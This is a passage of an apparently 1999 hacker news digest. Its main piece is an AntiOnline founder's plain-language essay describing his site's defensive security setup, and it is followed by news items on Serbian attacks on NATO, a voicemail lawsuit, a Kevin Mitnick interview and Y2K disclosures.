       motives? What are they saying to other hack groups? What sites have they
       hit? What domains do they have access to? So on and so on. 
       
       
       [So JP/AO are now gathering profiles on active hacking groups. Seems these
       groups that talk to him for his stories should be careful what they say.]

      From AntiOnline  
       
      Greetings All:
       
      I was planning on writing this up in a formal, stuffed shirt, journalistic mode,
      but soon decided that wasn't me, and that I'd be able to explain it better in my "MailBag"
      style of writing. So, I've warned you. Continue reading at your own risk, heh.....
       
      I get dozens of e-mails a day asking me different questions about our own security. What 
      products do we use, what policies do we have, how do we monitor, administer, firewall, and
      so on? Well, here it is. I'm going to go through our current security infrastructure step
      by step. I'll give you everything from descriptions of proprietary in-house software that
      we use, to our Cisco router configuration files. I've always said (as have many, many 
      others for that matter), that there is no such thing as "security through obscurity", so 
      I'm going to practice what I preach. I don't want the "average users" that read our site 
      to get intimidated at this point. I'm going to go through everything step by step, provide
      links where you can learn more about any subject which becomes "technical", and will use 
      common English (which I use anyway. I hate reading books written by college professors which 
      put forth a larger effort convincing the reader they know every technical bit of jargon under
      the sun, than they do actually explaining their subject matter). Also, I hope to dispel the 
      common myth that securing a network has to be an expensive endeavor. We are not a big
      budget operation by any extent of the imagination, and you don't have to be one either.

     So without further delay, here it is. The AntiOnline Information Security Systems and Policies.

     Yours In CyberSpace,
     John Vranesevich
     Founder, AntiOnline


     1 Environmental Security (I'm not talking about our operating systems.) 
     2 Garbage In, Garbage Out (How secure is our uplink?) 
     3 Ground Zero (Using Our Router As A First Line Of Defense) 
     4 There's No Place Like Home (Our desktops, or a battle ground?) 
     5 Watching Our Network (Highways have patrolmen and so does AntiOnline's network.) 
     6 OH MY GOD IT'S A HACKER!!! (Calling their ISP doesn't cut it, we have to stand up for ourselves!) 
     7 Neighborhood Watch (The woman across the street with a pair of binoculars, or BugTraq?) 
     8 Great, We're Finally Secure (No we're not.) 
     
     Environmental Security (I'm not talking about our operating systems.)

       Let's start at ground zero. Our offices. Having advanced digital security in 
       place does us no good if our physical and environmental security is lacking. 
       While this is probably not the most exciting or technical issue that I'll be 
       covering, I felt it important to include in the overview of our system.
       
       Physical Security:
       
       We use a wireless security system by Linear. There are a couple of good things 
       which attracted us to this system. First, it's all battery operated, with the 
       exception of the base unit. The base unit does, however, have a battery back-up
       incase of power outage. We use standard door and window censors, as well as 
       motion and heat change detectors, smoke alarms, and carbon dioxide detectors.
       If a sensor is triggered, it sends an alert signal to our base unit, which sets
       off a loud audible alarm, as  well as contacting our monitoring service. The 
       sensors also send an "on-line signal" once every minute to the base unit. If
       the base unit fails to receive a signal from one of these devices, the alarm
       is sounded as well (this protects against signal jammers and the like). There
       are only a few vulnerabilities that I could predict for this system. The main
       one would be someone cutting the phone lines where they enter the building. 
       Although we'd still get an audible alarm, the monitoring station wouldn't be
       contacted, unless by us directly using a cellular phone, or by a neighboring
       business hearing the alarm and alerting the police, which patrol this area on
       a regular basis anyway (We found out that the police have a very good response 
       time to our location. We had to call them once to report a "suspicious vehicle" 
       that was sitting in our parking lot at night for some time with all of its 
       lights off. It turned out that the vehicle contained little more than a couple 
       of teenagers that decided to use our parking lot as a convenient place to test 
       out their vehicle's shocks, if you know what I mean.) Our system also includes 
       a closed circuit television system, which sends footage via video cables to a 
       monitoring station and vcr in my apartment. Outdoor lighting is on at all times
        after dark, and battery operated exit lighting is activated during power
       outages. Every floor also has a fire extinguisher mounted in a convenient place.
       
       The major vulnerability that we currently have as far as physical security goes 
       would be from herf or tempest related attacks. With a herf attack, we would only
       have to worry about the loss of data, and not the compromise of it (we do include
       current copies of nearly everything off site). Due to our location, a tempest 
       attack would be very difficult, and incomprehensibly unlikely. If some agency is
       sitting in a van outside of our office and is monitoring us via tempest, we have 
       a lot more problems to worry about than our data being compromised. 
       
       Environmental Security:
       
       Our office has both central heat and air, and we try to maintain a constant in-door
       temperature of 70 degrees. Each room has a Kenmore Hepa-Filter and Air Ionizer to
       help maintain a dust free atmosphere. We use "Office Care" anti-dust and static 
       wipes on all monitors, and lightly mist the office carpeted floor with a mixture of
       liquid fabric softener and water once a week (That is a GREAT tip to ensure a static
       free environment that I picked up from the 1996 International Super Computing
       Convention).
       
       We also shred EVERY scrap of paper that leaves the office with an "Office Companion"
       paper shredder (making sure that we stir it all up before throwing it away
       (Yes, we actually do this, scarry, isn't it?). This helps to stop any dumpster divers
       from getting any trade secrets, or other goodies from our garbage.
       
       Every window has a mini-blind on it, which would make it difficult to look over our 
       shoulders from 100 feet away with binoculars. We usually have loud music playing
       which would make it very unpleasant to try and spy in on us with a laser listening 
       device pointed at a window (haha).
       
       All computers in our offices are on battery back up systems. We have a calibrated 
       up-time of a little under 3 hours without electricity on all servers and network
       equipment. We have both rack mount and floor model APC Smart-UPS systems. One of
       our network monitoring stations alerts us in the event of a power outage, and
       all servers get safely shut down when the batteries reach a critically low level
       (this is all done through the Smart-UPS software).
                                                                                    
       Garbage In, Garbage Out (How secure is our uplink?):
       
       It's an expression that my high school chemistry teacher used to use when working
       with complex formulas, but I've found it to apply to information security (and many
       other things) as well. Having a very secure lan does little good if there's someone
       sitting on our upstream provider sniffing every un-encrypted packet that comes into
       us or leaves from us.
       
       We go through a company called "StarGate". They're the largest ISP in the Pittsburgh 
       area, with over 20,000 customers, 1,500 of which are corporate. Now, there is one
       bad thing to assume here. "Oh, it's a huge ISP, they must really know what they're 
       doing, and be very secure". Well, don't count on it.
       
       Our first step was to compile a list of a half dozen different ISPs. We chose these 
       based on the speed of the backbone that they have, available services that they
       offered, the size of their staff, the types of technology that they implemented, and
       of course, cost. We found that Stargate had a redundant dual T3 connection to the
       backbone, a staff of over 60, and although their fees were a little more than some of
       their competitors, we felt that they were probably the best over-all ISP for us. We
       called and talked to both corporate account agents, and engineers, to get a feel for
       the staff and the technology that they use. We did several trace routes from various
       machines through their network, to get an idea of how traffic was routed, and even 
       checked for any obvious security holes.
       
       As standard procedure, StarGate usually monitors traffic to their customer's networks
       so that they can be alerted automatically if the circuit goes down, and so they can
       keep bandwidth usage reports. They also are accustom to providing both DNS and Email
       services for nearly every one of their customers. We decided, to help ensure the 
       integrity of our data, that we would disable their ability to monitor our traffic and
       bandwidth (which meant setting up special arrangements to allow them to be notified 
       if our circuit goes down), and to do all of our own service hosting (which includes 
       e-mail and dns). Our email server sends directly to all remote hosts, instead of
       using our ISP's server as an intermediary.
       
       If I had first choice, I would have gotten a connection directly to the backbone 
       (which you can get from Sprint for about the same as going through an intermediary ISP).
       That would have eliminated an entire network from our loop, but we found that due to our 
       location, that would have been nearly impossible due to the distance that the
       circuit would have had to travel (in other words, T-1s have distance sensitive charges,
       and Bell Atlantic would have socked it to us).
       
        

       Ground Zero (Using Our Router As A First Line Of Defense):
       
       Although it takes security on all levels to ensure a secured lan, this is what I consider 
       to be THE MOST single important security measure that we have in place.
       
       We use a Cisco 2611 router with integrated csu. We upgraded both the ram (with an extra 
       32meg dimm) and the IOS server software to 11.3.7(T) Enterprise Plus edition. This allows
       us to implement the newest security features offered by IOS.
       
       Before I go any further, let me give you all a little piece of advice on buying ram for 
       your Cisco Router. For THE LOVE OF ALL THAT IS GOOD, do NOT by your ram from Cisco. We 
       priced a 32 meg dimm from cisco as being almost $1,000. Now, through a third party vendor 
       (which was kindly pointed out to us by Corey Gallatin), we only paid $70. The vendor is 
       Crucial Technology, they're worth a look (you can get flash memory cheap too).
       
       We use both static and recursive access lists, as well as TCP Intercept (I'll go more in
       depth about those below). The router can only be accessed via console (almost totally 
       eliminates the fear of someone breaking into the router, which would be a bad thing.) 
       We also log all denies to a syslog server (I'll talk more about what we do
       with those in my section on network monitoring).
       
       Below is the actual configuration file from our Cisco Router (All of the relevant parts of
       it anyway. I took out things like the interface definitions, routing information,
       encrypted password strings, etc. This is by no means meant to be an example to follow for
       setting up a cisco configuration file, but mainly to show our use of access lists
       to deny traffic into our internal lan). We spent a great deal of time auditing our systems
       and determining our risks before creating this file. It's important to have a list of
       all servers and what services they're running. It's also important to have a list of all
       workstations along with a description of how much access each one of them should
       have to the lan and the internet. This will make it MUCH easier to come up with your final
        configuration without too much trouble.

       !
       Being able to finger current connections to the router is evil.  Disable it.
       no ip finger
       This is the start of the tcp intercept configuration.  TCP Intercept is a relatively 
       new feature of IOS designed to stop SynFloods.  The router will check to make sure that every 
       new connection coming in is valid, and then creates an internal table of each connection, valid 
       or invalid.  It will permit through only valid connections, which stops synflooding, and having 
       an internal table means it only has to verify connections from a host once within an established 
       time period, which cuts down on router processor utilization (but eats up the ram, which is why 
       we upgraded it).

       There's No Place Like Home (Our desktops, or a battle ground?):
       
       Oook, now starts the fun stuff. Workstation and Server security.
       
       There's a well known phrase in the security field which goes something like 
       "If you have physical access, you have administrative access". Meaning that
       there are several ways to gain access to a machine if you're sitting in front
       of it. We do several things to help prevent this. For starters, head into the
       BIOS and turn off booting up from floppy or CD. Common sense, but there are 
       many a high school admin that's been burned by a 7th grader by not doing this.
       Our servers all have locking cases  (which require a key to open), and some 
       use fingerprint recognition units to allow us quick and secure access to them
       (without having to remember a long password
       which changes regularly. Stop the stickies!).
       
       My personal workstation has a MaxLock hardware encryption device installed, 
       which dynamically triple DES encrypts and decrypts all data on the hard drive.
       
       Now, with the exception of my personal machine, it would be possible for say, 
       a governmental organization to come in here with a warrant, confiscate all of 
       our equipment, and take the data right off of it (with the exception of my machine, 
       which has the dynamic hardware encryption). I'll be the first to admit that having 
       locked cases with biometric units attached would do little good to prevent this. 
       However, all important data is stored on removable units, which are all sufficiently
       encrypted.Our main concern is not from government intervention, but rather from 
       some third party breaking in and running off with equipment (which is why we have 
       an extensive physical security system in place).
       
       To take care of network oriented intrusions on the servers:
       
       We use Memco's "Secured" (for solaris), which is an incredible product that all but
       eliminates the possibility of buffer overflow or root attacks.
       
       We also run ISS's "RealSecure Agent For NT" (see my chapter on network security for 
       more information on RealSecure).
       
       NT based servers and workstations use Norton AntiVirus (I would highly recommend 
       Norton System Works by Symantec for a low cost set of utilities for win based
       systems).
       
       Of course, we use PGP for encrypted e-mail communications.
       
       Keep in mind those are used on top of standard security measures, such as insuring 
       that we're never running a service that has known vulnerabilities, using strong
       passwords that are changed on a regular basis, etc.
       

       Watching Our Network (Highways have patrolmen and so does AntiOnline's network):

       We do a LOT of network monitoring. I'm not going to go into the boring details of 
       EVERYTHING that we do, but here's a look at some of the more important things.
       
       To keep an eye on data running over our network, we primarily use ISS's Real Secure. 
       I can't speak highly enough of this program. It watches the network for certain
       attack signature, and can do several things when it finds them. First, we have it 
       notify a console on one of the monitoring stations, then kill the remote connection 
       to our network where the attack is coming from, update our "hack attempts" page on 
       AntiOnline, and log everything into a database (this database will be used to 
       dynamically put deny statements into our router to firewall trouble users off of
       our lan once and for all). The console monitoring and connection kill are built in 
       features of RealSecure, everything else is done via proprietary actions that we 
       programmed on our own (realsecure will pass parameters to external programs on event,
       if you choose to have it do so). RealSecure also has agents which can sit on a 
       server and watch it, sending information back to the console machine, although we 
       currently only have this implemented on one of our servers for test purposes.
       
       Now, there is one problem that could arise by using RealSecure. Obviously, what it's
       doing is throwing the interface card into promiscuous mode, and sniffing the network.
       Now, this works just fine if you're using a standard hub, but if you're using a 
       switched hub (which prevents sniffing, which is a good thing), RealSecure will not
       be able to monitor the network, which means that it won't be able to detect attacks
        (other than attacks reported to it from Agents which sit on the server machines). 
       So, what we did was get an HP Switch, which will allow switching for every port, 
       except a "Master Port" which can be configured to receive all data. So, the only 
       machine on our network which can sniff, is the network monitoring station. Another 
       alternative to this would be to set up a sort of switch DMZ (de-militarized zone), 
       where the data coming in from your router would go to a primary un-switched hub, 
       which your network monitoring stations would run off of, then going into a second, 
       switched hub, that the rest of your network would run off of. Using the HP 
       configurable switch saved us the money and hassle of having to do that.
       
       
       AntiOnline's Hacker Tracker:
       
       AntiOnline's Hacker Tracker is a work in progress for us. It gives me something to 
       do in my spare time, and is forcing me to learn more about programming than I had
       ever wanted to. Heh. Here's a brief overview of this experimental system, as well
       as what I hope it will become in the future:
       
       We pay no attention to most of the attacks against us. The types of attacks which
       appear on our "hack attempts page", are simply sent through an automated system
       which log them, database them, etc. Those aren't what we're worried about. What
       we're worried about are the attacks which DON'T fit into common, predefined
       categories which we have set.
       
       Most security scanners now, including RealSecure, look for "attack signatures".
       This system works great if the hacker is using a KNOWN method of hacking a system.
       However, if the hacker is using a "new method", it's useless. So how do we look 
       for something, when we don't really know what we're looking for? Every user that
       makes a connection of any type into our lan is expected to do certain "normal" 
       things. Here's an example:
       
       We can expect a user to connect to www.AntiOnline.com, and shortly there after it
       would be "normal" to see a connection from that same host on www.AntiSearch.com, 
       or to noc.AntiOnline.com. That is "normal" behavior. A user following links on 
       the site, looking at different pages, which may be on different
       servers.
       
       However, suppose we see a user which does something like this:
       
       We see a host connect to www.AntiOnline.com, and then to www.AntiSearch.com. Then, 
       we see the same host connecting to our smtp server. This is NOT "normal" behavior. 
       If the user was simply providing feedback on the visit, it would either be done via
       contact forms on our site (which would be "normal" activity), or we would see a 
       connection to the smtp server from a separate, outside host (which would be 
       indicative of the user sending us an e-mail, which "normally" would be sent to an
       intermediary mail server, which would pass the mail along to us). So, seeing the 
       host connecting to our smtp server directly could mean that they're using a mail 
       client which "direct connects" to our server (which is rare), or they have a mail
       server set up on the same machine that they're surfing from (which is also rare, 
       unless in the case of a shell server, but our page looks sucky in lynx, so that's
       rare too). While what the user is doing may not really be a hack attempt, it is 
       not "normal" activity for our network, so it's flagged for us to look at.
       
       While the above is not something that our system would actually flag for us, it
       should give you an idea of how our system works. We've been working on it for a 
       while  now, and it continues to grow and evolve as we do. We hope to make it much 
       more advanced in the future, by taking data from the thousands of hacks that we 
       have on file, and turning it into an actual "artificial intelligence system" which
       can examine behavior in comparison to known attempts on thousands of other sites.
       I'm by no  means a great programmer, so maybe in the future we will hook up with 
       someone to turn this into something cool.
       
       Our Router:
       
       On top of using a network monitoring station, we also have our router send us logs
       of every "deny" and every "allow" that are initiated by the access lists, which are 
       sent to a network monitoring station. These logs are parsed by a proprietary program
       that we wrote, and sent into a MiniSQL database. Syslogs from some servers are 
       passed to this machine as well, and processes on the servers are matched against the
       processes coming through the router (You can find out ALL SORTS of interesting things 
       by doing this). By having all of this data archived and put into a database, it will 
       allow us to use it in other, more advanced applications in the future.
       

       OH MY GOD IT'S A HACKER!!! (Calling their ISP doesn't cut it, we have to stand up
       for ourselves!):
       
       Many people have asked us what we "do" with the logs of hack attempts against us 
       that we see on a daily basis. Well, unlike many organizations, where hack attempts
       are viewed as "events" which are to be "looked into", hack attempts against 
       AntiOnline are the rule, not the exception. As a policy, we do not "turn over" any 
       hack  attempts for investigation by any governmental authorities, nor would we do 
       so if a hacker actually managed to gain access to one of our systems. Due to the 
       type of organization that we are, we feel that would be hypocritical. We feel that
       the important thing for us to do is "secure" our network, because trying to intimidate
       people from attempting to hack us for fear of prosecution is ridiculous (something 
       which sounds common sense, but our government is just now realizing the significance 
       of it).
       
       We may do several things with users that make "hack attempts" against us. First off, 
       it's logged and sent to our database. We identify trouble users, and "take action" as
       we see fit. A few examples of what we may do:
       
       On common hack attempts, the user's IP address or domain is dynamically posted on our
        "hack attempts" page, along with the type of attack the user tried.
       
       We set up a host_deny list for apache using mod_rewrite (Very cool stuff. If you're not
       familiar with mod_rewrite, I strongly suggest looking into it. We use it extensively.),
       which allows us, or our system, to add ip entries, causing the user to get a 403 access 
       forbidden when attempting to visit the page.
       
       If the "user" has done several hack attempts against us, the system may escalate the 
       attempt, and actually set up a deny statement in our router, which stops the host
       from even passing data into our lan.
       
       Our mail server uses the MAPS (Mail Abuse Prevention System) Real Time Black Hole List,
       to prevent spam. Any spammers that we observe are submitted to the list as well.
       
       There are several other responses that we are currently experimenting with, including 
       the ever controversial "retaliatory" ones (don't try that one at home kids).
              
       Neighborhood Watch (The woman across the street with a pair of binoculars, or BugTraq?)

       One of the things that we spend a lot of time and resources on is gathering "intelligence".
       Finding out about the latest discovered vulnerabilities is something nearly every
       responsible administrator does, and is something that nearly every responsible security 
       administrator is obsessed with. But, we take things one step further.
       
       Not only do we try to keep up with the latest exploits and vulnerabilities, we also try to
       keep up with the latest THREATS. Exploits are no danger to a system at all, if there's no
       one trying to use them against you. But, as with many networks, there never seems to be a
       limited supply of people willing to use those exploits against us. So, one of the things 
       that we do (and dedicate a lot of resources to), is gathering intelligence. 
       
       What are the active hack groups? Who's in those groups? What groups were those people in 
       before this one? What exploits were used? What are their motives? What are they saying to 
       other hack groups? What sites have they hit? What domains do they have access to? So on and 
       so on. Although we realize there is no way to determine every possible person out there who 
       may get the whim one evening to attempt a serious hack, we have found in the past being able
       to do such a "risk assessment" has allowed us to deflect many serious hack attempts against 
       us (now, to be perfectly honest, this information also helps in our news coverage of hacks,
       etc. and also provides us with some VERY interesting research data for use with our 
       experimental Hacker Tracker).
       
       On top of that, we do a lot of the standard "vulnerability and exploit" monitoring as well.
       Keeping up with BugTraq, NT BugTraq, RootShell, CERT (which is a great way to learn about 
       vulnerabilities which were discovered a few months ago, hah), as well as a slew of hacker 
       mail-lists, zines, news groups, and IRC.
       
        

       Great, We're Finally Secure (No we're not.)
       
       I'm going to end this little ditty with a phrase that I use often, and always try to keep in mind:
       
       "Securing A Network Is A Process, Not An Event"
       
       If you've gotten nothing else out of this report, I hope that you remember that one sentence. It's 
       the best piece of advice that any security guru could give you. Let me use the following analogy:
       
       You work hard, save your money, and establish your credit. Finally, you're able to build that 
       special house that you've always dreamed of. You get the best architect to draw the blueprints,
       and hire the best contractors to build it. You even have a landscaper come in to put on the finishing
       touches.
       
       Now, your house is finished and flawless. However, does that mean that your never going to have to 
       work on it again? Your home takes constant care. Washing, cleaning, and yard work on a regular basis
       to maintain it. New carpet, roofing, and paint every few years to keep your house in perfect order.
       
       Think right now, what your house would look like if you just "left it". Soon the dust bunnies would
       move in, followed by that "I went on vacation in the summer and the house was closed up for a week
       and a half" smell, and the ever so shameful "I went to pour milk on my cereal and it came out of the
       carton in lumps". After a while, you would start noticing water from the ceiling dripping onto your 
       carpet during a rain, and the mushrooms and other fungus would begin growing off of those dust bunnies
       which are now the size of elephants. Not a pretty site, is it?
       
       Unfortunately, many system admins don't look at their network the same as they would their new house.
        After the contractors leave, they simply lay back and enjoy. Sure, it looks and works great at first.
        he office has that "there are thousands of dollars of brand spankin new technology in here" smell 
       (come on, all you techies know the one), and you're sitting pretty high on your new office chair 
       (the kind that has a lever on the size that let's you drop your seat to it's lowest position at the 
       end of the day, swing yourself from out under the desk, and the remains spinning for at least three 
       minutes after you've gotten into your car).
       
       But soon, the hub's collision lights start going on more and more frequently, the chair refuses to go 
       in the up position until you get off of it, and you're wrists are no longer positioned at that perfect 
       "I hope I don't get the syndrome" position.
       
       You get the idea.

       NATO Fights Serbs Online
       
       Military headquarters shores up Web site against Serbian hacker attacks.
       by Elizabeth de Bony, IDG News Service April 2, 1999, 5:03 p.m. PT
                                
       The North Atlantic Treaty Organization has started defensive measures to
       protect its e-mail and Web site systems against a well-prepared propaganda
       campaign launched by Serbian hackers. 
       
       NATO is taking the measures "as soon as possible, but given the size of 
       the problem, it will be difficult," a source at NATO military headquarters
       confirms, declining to provide any details. "These are open systems, and 
       although we do not want to close them to the public, this is an option." 
       
       The disruptions began last weekend, three days after NATO began its bombing
       missions. That afternoon a hacker in Belgrade saturated the NATO site with 
       "ping" bombardment--a tactic in which one computer automatically and 
       repeatedly calls another.
       
       On a daily basis, another Belgrade-based hacker floods NATO's e-mail system 
       with nearly 2000 messages. The e-mail introduces up to five additional 
       computer viruses into the system.
       
       "This is clearly a new element in warfare in the twenty-first century," the
       source says.The risk is that without a rapid solution, the hackers may move
       on to more damaging activities, such as downloading press releases and 
       imagery available on the site, tampering with them, and then releasing them
       as official documents. 
       
       "All of this is well prepared, and part of Milosevic's propaganda war," 
       the source explains.

       NATO site, email suffer hacks 
       By Reuters
       Special to CNET News.com
       March 31, 1999, 4:00 p.m. PT 
  
       BRUSSELS--NATO said today that Yugoslav hackers had broken into its Internet
       home page and jammed its email system with 2,000 messages per day.
  
       NATO spokesman Jamie Shea said service on NATO's home page had been "erratic 
       to say the least" since March 28, the fifth day of the alliance's bombing 
       campaign against Yugoslavia. 
  
       "It seems that we have been dealing with some hackers in Belgrade, who have
       hacked into our Web site," Shea told a news conference at NATO headquarters 
       in Brussels. 
  
       "At the same time, our email system has also been saturated by one individual 
       who is currently sending us 2,000 emails a day. We are dealing with macro 
       viruses from Yugoslavia in our email system," he said. 
  
       A senior NATO diplomat said it was clear how well-organized and prepared 
       Belgrade's offensive was: "It ranges all the way from organized ethnic 
       cleansing to messing up our Web site." 
  
       Shea added: "Let me assure you that despite these technical glitches, you will
       continue to receive updated political and operation information from this alliance."

  23.0 Chicago man sues employer over having week voicemail security.

       Posted at 6:53 a.m. PST Friday, April 2, 1999 
 
       Man sues employer over voice-mail
       abuse
 
       CHICAGO (AP) -- A suburban Chicago man is suing his employer for allegedly failing
       to adequately secure the company voice-mail system, even after he complained that
       someone had hacked into the system and was passing offensive messages about him.
 
       ``I hope that this makes other companies look at their systems and say, 'Gee, could this
       happen with our company?' '' Gary Thompson, 45, said Thursday from his home in
       Wheaton. ``I would be willing to bet most companies haven't even thought about this.''
 
       Thompson, who is suing both Jewel Food Stores and its parent, Utah-based American
       Food Stores Co., claims that on five occasions beginning in 1996, someone posing as a
       private investigator hired by the company left false and defamatory messages in the
       voice-mail boxes of hundreds of American Stores' employees nationwide.
 
       The messages included claims that he had HIV, was a drug user, cheated on his wife with
       company secretaries and stole from the company.
 
       ``I started being treated differently immediately after the first message. Work associates
       stopped shaking my hand,'' said Thompson, who is on disability leave after suffering what 
       he described as severe depression in the wake of the voice-mail attacks.
 
       One day Thompson found a note on the front seat of his car in which the author said they 
       understood he was dying of AIDS and wanted to know how to apply for his reserved parking 
       space.
 
       ``Those kinds of things start to build up and get to you,'' he said. ``No one could know 
       or understand what it's like to be in my shoes.''
 
       While the law has begun to adapt to issues of privacy and copyright infringement relating 
       to the Internet and e-mail, voice mail has produced a similar set of concerns.
 
       ``As technology advances, people are finding new ways of abusing of it,'' said David Loundy,
       a Chicago attorney specializing in technology law.
 
   **  Voice-mail security was at the crux of the dispute last year between Chiquita Brands 
       International and a Cincinnati Enquirer reporter who broke into the company voice-mail system
       to gather information for a story that was highly critical of Chiquita.
 
       The reporter's work was later retracted, and he and a Chiquita employee were prosecuted for 
       tampering with the voice-mail system. The reporter later pleaded guilty to two felony charges.
 
   **  Thompson's lawsuit, filed in January in DuPage County Circuit Court, seeks in excess of $50,000
       in damages and also names as a defendant ``John Doe,'' the unidentified person who allegedly 
       obtained a distribution password enabling him to send the messages companywide. Thompson said
       he assumes the messenger is a former employee he may have dismissed.
 
       The company insists it reacted swiftly to Thompson's concerns.
 
       ``We believe that the allegations are unfounded,'' said Karen Ramos, a spokeswoman for Jewel.
       ``The company took immediate and appropriate action in response to the unauthorized voice-mail 
       messages in question.''
 
       Thompson's lawyer, Maureen Murphy, said companies are responsible for the systems they offer 
       employees.
 
       ``A little bit more of the burden has to be placed on the company to ensure security against 
       the magnitude of damage that can be done to people with the stroke of a key,'' she said. 
       ``(Companies are) the only ones in a position to stop it.''
 
       One legal expert said while there's no previous case law to draw on for Thompson's lawsuit, the
       old tenets of law apply.
 
       ``It would be kind of like if you had a job in a factory and they gave you a tool to work with
       that was faulty and you got injured,''  said George Trubow, director of the Center for Information
       Technology and Privacy Law at the John Marshall Law School in  Chicago. It is a ``fairly classic, 
       old-fashioned approach to employer liability.'

  24.0 Mitnick speaks in a rare q and a, (Forbes)

       By Adam L. Penenberg
       Forbes Digital Tool 4-5-99
       
       
       Kevin Mitnick is the most famous hacker in history. He has been in prison
       for more than four years for crimes that, when you get down to it, amount
       to little more than illegally copying proprietary software belonging to
       major companies including Motorola, Nokia and Sun.
       He was made a household name by New York Times reporter John Markoff, who
       featured Mitnick in a book called Cyberpunk (published in 1991), then
       wrote a front page story for the Times on July 4, 1994, that portrayed
       Mitnick as a superhacker who could wreak cyberhavoc--and ruin lives--if
       not caught by the Feds.
       Then a funny thing happened. Markoff's friend, Tsutomu Shimomura, claimed
       that Mitnick had hacked his home computer on Christmas Day, 1994, and went
       after him, with Markoff in tow. When Shimomura tracked Mitnick down in
       North Carolina, Markoff was there for the kill. This was documented in
       subsequent front-page stories and a book called Takedown, for which
       Markoff and Shimomura shared a $750,000 advance. Expect the movie version
       soon.
       
       
       Markoff became a journalism star as a result of his crusade.  Shimomura's
       name, in the ultimate geek tribute, is recognized by Microsoft Word98
       spell check. Not even Sherlock Holmes can say that.
       
       
       Yet, according to Dale Coddington and Brian Martin, both of whom were
       hired by the defense to comb through the 9 gigabytes of electronic
       evidence amassed against Mitnick, there is no proof that Mitnick hacked
       Shimomura. For all the fanfare it received, it was never contained in the
       indictment. Yet, the media coverage has had a profound impact on Mitnick's
       case.
       
       
       Mitnick reads everything written about him and says he often cant believe
       what he reads. He has seen himself portrayed as a "dark side" hacker
       intent on toppling civilization; a criminal who as a teenager penetrated
       computers at NORAD, inspiring the hit flick War Games; a phone phreaker
       who, just by whistling three tones into a telephone receiver, could launch
       World War III; and a computer hacker who, merely armed with a computer
       sans modem, could wreak cyberhavoc from his jail cell. 
       
       
       But the reality is a lot less sexy. Kevin Mitnick is a recreational hacker
       with a compulsive-obsessive relationship to information. He hoarded
       information, never sold it, and wouldnt even share it with his friends.. 
       
       
       Although he is portrayed in the upcoming film Takedown as an evil menace
       to society, Mitnick is really just your average geek who has done some bad
       things in his life, and has paid the price. To this day, he would like
       nothing more than to dissect some computer program to see how it works.
       
       
       Says Martin, who often visited Mitnick in prison, "Kevin still wants to
       look through cellular source code to see how it works. You can see it in
       his eyes that he'd love to kick back with a printout and just figure it
       out on his own."
       
       
       Mitnick doesnt trust the media. But he agreed to let Forbes interview him
       over a span of several evenings recently by telephone.
       
       
       Here is Kevin Mitnick in his own words: 
       
       
       Forbes.com [F]: How would you characterize the media coverage of you? 
       
       
       Mitnick [M]: When I read about myself in the media even I don't recognize
       me. The myth of Kevin Mitnick is much more interesting than the reality of
       Kevin Mitnick. If they told the reality, no one would care. 
       
       
       [F} Have stories that John Markoff wrote about you in The New York Times
       had any impact on your legal proceedings?
       
       
       [M} Markoff has single-handedly created "The Myth of Kevin Mitnick," 
       which everyone is using to advance their own agendas. I wasn't a hacker
       for the publicity. I never hacked for personal gain. If I was some unknown
       hacker, accused of copying programs from cell phone companies, I wouldn't
       be here. Markoff's printing false and defamatory material about me on the
       front page of The New York Times had a substantial effect on my case and
       reputation. He's the main reason I'm still in custody.
       
       
       [F] The Times continues to report (most recently on March 18) that you had
       hacked NORAD. Is this true?
       
       
       [M] No way, no how did I break into NORAD. That's a complete myth. And I
       never attempted to access anything considered to be classified government
       systems.
       
       
       [F] What do you think about hacks done in your name--for instance, last
       September's hack of The New York Times web site. Do they further your
       cause?
       
       
       [M] I don't condone anyone causing damage in my name, or doing anything
       malicious in support of my plight. There are more productive ways to help
       me. As a hacker myself, I never intentionally damaged anything.
       
       
       [F] How have you spent most of your time in prison? 
       
       
       [M] Most people here are content watching TV, playing pinochle, dominoes
       and poker. I work on my defense 14 hours a day.
       
       
       [F] What do you think of the restrictions placed on you when you get out
       of prison as part of your plea agreement? 
       
       
       [M] The requirements mandating I can't touch a computer or cell or
       cordless phone are akin to telling a forger not to use a pen or paper.
       There is no way I can earn a living when I get out. I couldn't even work
       at McDonald's. All I could do is something like gardening.
       
       
       [F] What do you plan on doing when you get out of prison? 
       
       
       [M] "I don't know, but once I get out of here and get on with the rest of
       my life, I'll never intentionally violate the law." 
       
       
       What do you think about Kevin Mitnick? Let us know in our forum.

  25.0 Australian stock exchange to carry out threat on Y2K slackers....       
       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

       ASX to name Y2K offenders 
       William Maher 
      
       The names of companies that have not disclosed the state of
       their Y2K preparations will be released tomorrow morning by
       the Australian Stock Exchange (ASX). 
      
       The ASX decided to carry through with the threat after it
       received a poor response to its latest Y2K survey of publicly
       listed Australian companies. Under a bill passed earlier this
       year, those companies must reveal the state of their Y2K
       compliance or face suspension by the ASX. 
      
       ASX spokesperson Gloria Peterson said that the response to
       the latest survey had been "disappointing". A total of 1,148
       companies were required to disclose details of their Y2K
       preparations, but a significant proportion failed to meet the
       March 31 deadline. "A great many companies are already
       suspended for something and just thought they didn't have to
       respond. But they were wrong," said Peterson. 
      
       Similarly, the Australian Securities and Investments
       Commission (ASIC) is also experiencing a poor response to its
       demands for Y2K details. Only half of the 700 financial brokers
       and investment advisors responded to ASIC's latest survey. 
      
       ASIC spokesperson Steven Blaney said that over 3,000 firms
       have now been given until mid-May to submit their details, or
       face action from ASIC staff. "I think that people will realise we
       are taking this issue very seriously. If they don't respond they
       should expect a visit from ASIC staff," he told Newswire. 
      
       Blaney added that problems were confined to a small number
       of firms which had not responded to demands for more
       information. For the most part, Blaney expects firms to be on
       track with preparations for 2000. "ASIC has quite a range of
       powers [to deal with non-respondants], but I don't think it will
       come to that," he said. 
      
       In related news, major insurers have limited their insurance
       policies covering Y2K-related disasters . The Insurance Council
       of Australia has said insurers are entitled to limit their policies
       because potential losses due to the millennium bug are
       foreseeable.

       Memory Boost for Palm V
       by Leander Kahney 
       
       3:00 a.m.  3.Apr.99.PST
       A Silicon Valley engineering firm is offering an 8-megabyte memory chip for
       users hungry to expand the un-upgradeable Palm V. 
       
       Because of its small size, sleek look, bright screen and rechargeable 
       batteries, 3Com's new Palm Pilot V is selling well, despite its hefty 
       US$450 price tag and slim 2 MB of memory. 
       
       But thanks to the ingenuity of Palm hackers, the miniscule memory chip can
       now be replaced with a whopping 8-MB module. 
       
       The procedure was first described by Japanese hacker Toshio Kashiwagi, who 
